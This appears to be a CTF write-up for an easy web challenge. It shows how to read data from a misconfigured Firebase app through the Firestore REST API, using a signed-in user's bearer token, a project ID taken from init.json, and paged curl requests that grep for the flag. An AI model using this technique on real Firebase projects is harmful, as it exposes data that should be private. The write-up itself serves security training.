+++
title = '07CTF 2025: Cryptic Mistake'
date = 2025-09-14T21:36:17+03:00
draft = false
showpage = true
+++

----
### Description
I made a cryptic hunt platform, but seems like I messed up big time.

https://v0-firebase-ctf-challenge.vercel.app/

Category: web <br>
Difficulty: easy <br>
Author: bhavya_32 <br>

----

This is a firebase app, which means we could check for misconfigurations.

![alt](lab1.png)

Sign in with a google account and get the Bearer Token ID.

![alt](lab2.png)

Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges.
To access firestore we use
```url
https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection}
```

`project_id` is found at `GET /__/firebase/init.json` endpoint during sign in.

![alt](lab3.png)

`collection` is `/teams` since there we have teams competing in the cryptic challenge.

```bash
curl 'https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams' \n
 -H 'Authorization: Bearer <token_id_we_found>' | grep 07CTF{
```

We won't find the flag since not all the informations about `/teams` is shown in this page.

![alt](lab4.png)

We need to request the next page and the next until we find it.

```bash
curl 'https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams?pageToken=AFTOeJz1QyxZtnd5EdXR_W-GqrTcAd1Jvqvha1yJZsHt3r_vWCVvDwzndkVp-Na0qbJ7qXUtylR5jXjbZZtXe6Mnkerx6NbtlR982aZvjRfcnegQW5zXRC0ZTDLw8tIt' \n
 -H 'Authorization: Bearer <token_id_we_found>' | grep 07CTF{
```

![alt](lab5.png)